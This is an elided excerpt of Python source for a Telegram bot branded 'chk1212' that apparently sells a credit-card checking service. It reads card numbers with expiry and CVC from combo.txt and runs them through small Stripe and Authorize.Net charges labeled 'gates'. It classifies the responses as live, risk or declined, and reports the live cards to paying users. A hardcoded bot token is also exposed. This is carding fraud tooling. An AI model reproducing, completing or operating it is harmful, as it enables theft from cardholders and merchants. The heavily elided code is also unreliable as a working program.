...
stopuser = {}
token = '7775672750:AAGWil7VOkBx7N4JqMnvbrOsnHTSuTzBI74'
	...
	def my_function():
	  ...
	  "timer": "none",
		...
		if BL == '𝗙𝗥𝗘𝗘':	
			...
			contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/chk1212")
...
𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
	''',reply_markup=keyboard)
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/chk1212")
		keyboard.add(contact_button)
...
Stripe Charge 1$ <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦 𝗢𝗡𝗟𝗜𝗡𝗘 
...
''',reply_markup=keyboard)
		...
		''',reply_markup=keyboard)
			...
			return
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text=f"🏴‍☠️ Stripe Charge 0.10$🏴‍☠️",callback_data='br')
		sw = types.InlineKeyboardButton(text=f" Stripe Charge 10$ 🪽",callback_data='sq')
		sw1 = types.InlineKeyboardButton(text=f" Stripe Charge 19$ 🪽",callback_data='st')
		sw2 = types.InlineKeyboardButton(text=f" Auth Net 6$ 🪽",callback_data='au')
		sw3 = types.InlineKeyboardButton(text=f" HQ Stripe Charge 1$ 💥",callback_data='ch')
		keyboard.add(contact_button)
		keyboard.add(sw)
		keyboard.add(sw1)
		keyboard.add(sw2)
			...
			with open("combo.txt", 'r') as file:
				...
				for cc in lino:
					...
					try:
						...
						print(e)
						last = "ERROR"
					if 'your card was declined.' in last or 'requires_action' in last:
						last='declined'
...
𝘽𝙤𝙩 𝘽𝙮 chk1212''', reply_markup=mes)
...
𝗕𝗼𝘁 𝗕𝘆: chk1212</b>'''
					if "insufficient_funds" in last or 'succeeded' in last or 'thank' in last or 'incorrect_cvc' in last or 'thank-you-for-your-support' in last or 'thank you' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
					elif 'security code is invalid' in last:
						ccnn+=1
					else:
						dd += 1
					time.sleep(4)
	...
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'au')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='Auth Net 6$'
...
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: chk1212</b>'''
					if "insufficient funds" in last or 'succeeded' in last or 'Thank You For Your Support!' in last or 'Thank You' in last or 'thank-you-for-your-support' in last or 'thank you' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
	...
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'ch')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='HQ Stripe Charge 1$💥'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
...
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: chk1212</b>'''
					if "insufficient_funds" in last or 'thank' in last or 'redirecturl' in last or 'redirect_to' in last or 'success' in last or 'thank you for your payment' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
...
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: chk1212</b>'''
					if "Your card has insufficient funds" in last or 'events-for-2024 thank-you' in last or 'events-for-2024' in last or 'Thank You' in last or 'events for 2024 thank you' in last or 'thank you' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
...
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: chk1212</b>'''
					if "Your card has insufficient funds" in last or 'redirecturl' in last or 'redirect_url' in last or 'Thank You' in last or 'success' in last or 'Thank you for your message' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
...
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: chk1212</b>'''
	if "insufficient funds" in last or 'Thank you for you support' in last or 'Thank You For Your Support!' in last or 'Thank You' in last or 'Thank you' in last or 'thank you' in last:
...
def start(message):
	def my_function():
		...
		try:
			...
			pas ='ALAA-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
